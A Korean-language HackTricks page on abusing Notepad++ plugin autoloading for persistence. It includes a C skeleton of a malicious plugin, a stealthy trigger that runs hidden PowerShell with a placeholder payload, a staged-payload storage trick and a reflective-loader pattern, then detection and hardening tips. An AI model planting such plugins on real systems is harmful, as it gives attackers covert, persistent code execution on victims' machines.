# Notepad++ Plugin 자동 로드 지속성 및 실행

{{#include ../../banners/hacktricks-training.md}}

Notepad++는 시작할 때 `plugins` 하위 폴더에서 찾은 모든 플러그인 DLL을 **자동으로 로드합니다**. **쓰기 가능한 Notepad++ 설치 경로**에 악성 플러그인을 넣으면 편집기가 시작될 때마다 `notepad++.exe` 내부에서 코드가 실행됩니다. 이를 **지속성**, 은밀한 **초기 실행**, 또는 편집기가 상승된 권한으로 실행될 경우 **프로세스 내부 로더**로 악용할 수 있습니다.<sup>[[1]](#references)</sup>

**Notepad++ 7.6+**에서는 수동 설치 시 플러그인마다 하위 폴더 하나를 사용하는 것이 일반적입니다(`plugins\<PluginName>\<PluginName>.dll`). **portable mode**( `notepad++.exe` 옆에 `doLocalConf.xml`이 있는 경우)에서는 전체 애플리케이션 트리가 해당 디렉터리에 유지됩니다. 따라서 복사된 도구 번들이나 관리자 도구 번들이 사용자가 쓰기 가능한 간편한 실행 경로가 되는 경우가 많습니다.<sup>[[2]](#references)</sup>

## 쓰기 가능한 플러그인 위치

- 표준 설치: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (일반적으로 쓰려면 관리자 권한이 필요함).<sup>[[1]](#references)</sup>
- 낮은 권한의 운영자가 사용할 수 있는 쓰기 가능 위치:<sup>[[1]](#references)</sup>
  - 사용자가 쓰기 가능한 폴더에서 **portable Notepad++ 빌드**를 사용합니다.
  - `C:\Program Files\Notepad++`를 사용자 제어 경로(예: `%LOCALAPPDATA%\npp\`)로 복사하고 해당 위치에서 `notepad++.exe`를 실행합니다.
  - `doLocalConf.xml`이 이미 포함되어 있으며 `Program Files` 외부에 있는 **관리자 도구 번들**, 압축 해제된 zip 복사본 또는 헬프 데스크 도구 모음을 찾습니다.
- 각 플러그인은 `plugins` 아래에 자체 하위 폴더를 가지며 시작할 때 자동으로 로드됩니다. 메뉴 항목은 **Plugins** 아래에 나타납니다.<sup>[[2]](#references)</sup>

빠른 초기 점검:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## 플러그인 로드 지점 (실행 프리미티브)
Notepad++는 특정 **export된 함수**를 예상합니다. 이 함수들은 모두 초기화 중에 호출되므로 여러 실행 지점이 제공됩니다:<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL이 로드될 때 즉시 실행됩니다(첫 번째 실행 지점).
- **`setInfo(NppData)`** — Notepad++ 핸들을 제공하기 위해 로드 시 한 번 호출됩니다. 일반적으로 메뉴 항목을 등록하는 곳입니다.
- **`getName()`** — 메뉴에 표시되는 플러그인 이름을 반환합니다.
- **`getFuncsArray(int *nbF)`** — 메뉴 명령을 반환합니다. 비어 있더라도 시작 시 호출됩니다.
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla 이벤트를 수신합니다(사용자 작업이나 편집기 이벤트가 발생할 때까지 payload 실행을 미루는 데 유용합니다).
- **`messageProc(UINT, WPARAM, LPARAM)`** — 메시지 핸들러로, 더 큰 데이터 교환에 유용합니다.
- **`isUnicode()`** — 로드 시 확인되는 호환성 플래그입니다.

대부분의 export는 **stub**으로 구현할 수 있습니다. 자동 로드 중 `DllMain` 또는 위의 콜백에서 실행할 수 있습니다.

## 최소 악성 플러그인 스켈레톤
예상되는 export를 포함한 DLL을 컴파일하고 쓰기 가능한 Notepad++ 폴더 아래의 `plugins\\MyNewPlugin\\MyNewPlugin.dll`에 배치합니다:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. DLL을 빌드합니다(Visual Studio/MinGW).
2. `plugins` 아래에 플러그인 하위 폴더를 만들고 DLL을 넣습니다.
3. Notepad++를 다시 시작합니다. DLL이 자동으로 로드되어 `DllMain`과 후속 콜백이 실행됩니다.

## `beNotified`를 통한 저소음 트리거 패턴
OPSEC를 위해 많은 payload는 `DllMain`에서 실행되지 않아야 합니다. 더 조용한 패턴은 플러그인을 정상적으로 로드한 다음, **시작 완료**, **버퍼 활성화** 또는 **첫 문자 입력**과 같은 일반적인 편집기 이벤트가 발생한 후에만 실행하는 것입니다.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

이 방식은 시끄러운 `DllMain` beacon보다 공개된 offensive research에 더 부합합니다. DLL은 시작 시 자동 로드되지만, 악성 동작은 Notepad++가 실제로 사용 중인 것으로 보일 때까지 지연됩니다.

## 플러그인 config 디렉터리를 보조 저장소로 사용하기
Notepad++는 **현재 사용자의 플러그인 설정 디렉터리**를 반환하는 `NPPM_GETPLUGINSCONFIGDIR`을 제공합니다.<sup>[[3]](#references)</sup> 악성 플러그인은 이를 이용해 디스크에 저장되는 DLL을 최소화하면서 암호화된 config, 스테이징된 payload 또는 tasking 파일을 일반적인 플러그인 상태에 섞여 보이는 경로에 저장할 수 있습니다.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

운영상 다음과 같은 경우 유용합니다:
- 자동 로드되는 작은 bootstrap DLL이 필요할 때;
- 메인 plugin binary를 다시 건드리지 않고 사용자별 tasking을 수행할 때;
- **autoload trigger**와 더 무거운 second stage를 분리할 때.

## Reflective loader plugin pattern
무기화된 plugin은 Notepad++를 **reflective DLL loader**로 바꿀 수 있습니다:<sup>[[1]](#references)</sup>
- 최소한의 UI/menu 항목(예: "LoadDLL")을 표시합니다.
- payload DLL을 가져올 **file path** 또는 **URL**을 받습니다.
- DLL을 현재 프로세스에 reflective하게 매핑하고 export된 진입점(예: 가져온 DLL 내부의 loader function)을 호출합니다.
- 장점: 새 loader를 실행하는 대신 정상적으로 보이는 GUI 프로세스를 재사용합니다. payload는 `notepad++.exe`의 무결성 수준을 상속합니다(승격된 컨텍스트 포함).
- 절충점: **서명되지 않은 plugin DLL**을 디스크에 기록하는 것은 눈에 띕니다. 실용적인 변형은 자동 로드되는 plugin을 stub으로만 사용하고 실제 implant는 다른 위치에 암호화된 상태로 저장하거나 staged 방식으로 두는 것입니다.

## 탐지 및 강화 참고 사항
- Notepad++ plugin 디렉터리(사용자 프로필의 portable 사본 포함)에 대한 **쓰기 작업**을 차단하거나 모니터링합니다. controlled folder access 또는 application allowlisting을 활성화합니다.
- `plugins` 아래의 **서명되지 않은 새 DLL**, portable Notepad++ 트리의 변경, `notepad++.exe`에서 발생하는 비정상적인 **자식 프로세스/네트워크 활동**에 경고를 설정합니다.
- 정상 plugin의 기준선을 만들고, 일반적인 Notepad++ plugin 인터페이스를 export하면서 shell, PowerShell 또는 network beacon도 실행하는 새 DLL을 조사합니다.
- **Plugins Admin**을 통해서만 plugin을 설치하도록 하고, 신뢰할 수 없는 경로에서 portable 사본을 실행하지 못하게 제한합니다.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
